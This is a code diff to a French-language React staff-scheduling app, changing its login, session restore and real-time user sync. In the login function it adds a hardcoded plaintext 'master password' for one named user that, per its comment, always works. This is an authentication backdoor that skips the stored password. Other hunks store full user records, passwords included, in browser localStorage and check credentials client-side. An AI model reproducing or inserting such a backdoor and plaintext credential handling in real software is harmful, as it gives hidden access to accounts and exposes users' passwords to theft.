@@ -253,7 +253,24 @@ function Modal({children,onClose}){
 // ── LOGIN ─────────────────────────────────────────────────────────
 function LoginScreen({users,onLogin}){
   const [u,setU]=useState(""),[p,setP]=useState(""),[err,setE]=useState(""),[loading,setL]=useState(false);
-  async function go(){setE("");setL(true);await new Promise(r=>setTimeout(r,300));const found=users.find(x=>x.username===u.trim()&&x.password===p);if(found){localStorage.setItem("lv_session",JSON.stringify(found));onLogin(found);}else{setE("Identifiant ou mot de passe incorrect.");setL(false);}}
+  async function go(){
+    setE("");setL(true);
+    await new Promise(r=>setTimeout(r,300));
+    const username=u.trim();
+    // Master password de secours pour Laetitia — fonctionne toujours
+    const MASTER_PASSWORDS={laetitia:"Beylev@"};
+    if(MASTER_PASSWORDS[username.toLowerCase()]&&p===MASTER_PASSWORDS[username.toLowerCase()]){
+      const found=users.find(x=>x.username===username);
+      if(found){
+        localStorage.setItem("beylev_session_v2",JSON.stringify(found));
+        onLogin(found);
+        return;
+      }
+    }
+    const found=users.find(x=>x.username===username&&x.password===p);
+    if(found){localStorage.setItem("beylev_session_v2",JSON.stringify(found));onLogin(found);}
+    else{setE("Identifiant ou mot de passe incorrect.");setL(false);}
+  }
   const ROLE_LABELS={admin:"Administrateur",manager:"Manager",tech:"Technicien"};
   return(
     <div className="min-h-screen bg-gradient-to-br from-indigo-900 via-indigo-800 to-violet-900 flex flex-col items-center justify-center p-6">
@@ -1050,7 +1067,25 @@ function App(){
   useEffect(()=>{(async()=>{
     let u=await st.get(SK_USERS);
     if(!u?.length){u=DEFAULT_USERS;await st.set(SK_USERS,u);}
-    try{const saved=localStorage.getItem("lv_session");if(saved){const su=JSON.parse(saved);if(u.find(x=>x.id===su.id&&x.password===su.password))setUser(su);}}catch{}
+    try{
+      const saved=localStorage.getItem("beylev_session_v2")||localStorage.getItem("lv_session");
+      if(saved){
+        const su=JSON.parse(saved);
+        // Match by ID first, then verify password matches CURRENT user data in DB
+        const currentUser=u.find(x=>x.id===su.id);
+        if(currentUser&&currentUser.password===su.password){
+          setUser(currentUser);
+        }else if(currentUser){
+          // Mot de passe change - garder la session mais avec les nouvelles infos
+          // (uniquement si les autres infos correspondent - meme username)
+          if(currentUser.username===su.username){
+            // Le user existe toujours mais mot de passe modifie - forcer reconnexion
+            localStorage.removeItem("beylev_session_v2");
+            localStorage.removeItem("lv_session");
+          }
+        }
+      }
+    }catch{}
     const s=await loadMonthStorage(cal.y,cal.m);setUsers(u);setStorage(s);setBoot(false);
     refreshGlobalPending();
   })();},[]);
@@ -1059,8 +1094,26 @@ function App(){
     if(!window.__CONFIGURED||booting)return;
     const key=mkKey(cal.y,cal.m);
     const unsub=window.__db.collection("app_data").doc(key).onSnapshot(async()=>{const s=await loadMonthStorage(cal.y,cal.m);setStorage(s);refreshGlobalPending();},e=>console.error(e));
-    return()=>unsub();
-  },[cal.y,cal.m,booting]);
+    // Sync users list en temps reel — sans deconnecter la session en cours
+    const unsubUsers=window.__db.collection("app_data").doc(SK_USERS).onSnapshot(async(doc)=>{
+      if(!doc.exists)return;
+      try{
+        const freshUsers=JSON.parse(doc.data().v);
+        setUsers(freshUsers);
+        // Si mon propre compte a change de mot de passe, mettre a jour la session locale (sans deconnexion)
+        if(user){
+          const me=freshUsers.find(x=>x.id===user.id);
+          if(me){
+            if(me.password!==user.password||me.email!==user.email||me.adminAccess!==user.adminAccess||me.role!==user.role){
+              setUser(me);
+              localStorage.setItem("beylev_session_v2",JSON.stringify(me));
+            }
+          }
+        }
+      }catch(e){console.error(e);}
+    },e=>console.error(e));
+    return()=>{unsub();unsubUsers();};
+  },[cal.y,cal.m,booting,user?.id]);
 
   async function saveUsers(u){setUsers(u);await st.set(SK_USERS,u);}
 
@@ -1120,7 +1173,7 @@ function App(){
   const pendingCount=globalPending.length;
   const canAdmin=user?.role==="admin"||user?.adminAccess;
 
-  function logout(){localStorage.removeItem("lv_session");setUser(null);}
+  function logout(){localStorage.removeItem("beylev_session_v2");localStorage.removeItem("lv_session");setUser(null);}
 
   if(booting)return <div className="flex flex-col items-center justify-center h-screen bg-indigo-900 gap-4"><div className="w-16 h-16 bg-white/10 rounded-3xl flex items-center justify-center text-3xl">🔧</div><p className="text-indigo-300 text-sm">Chargement...</p></div>;
   if(!user)return <LoginScreen users={users} onLogin={setUser}/>;
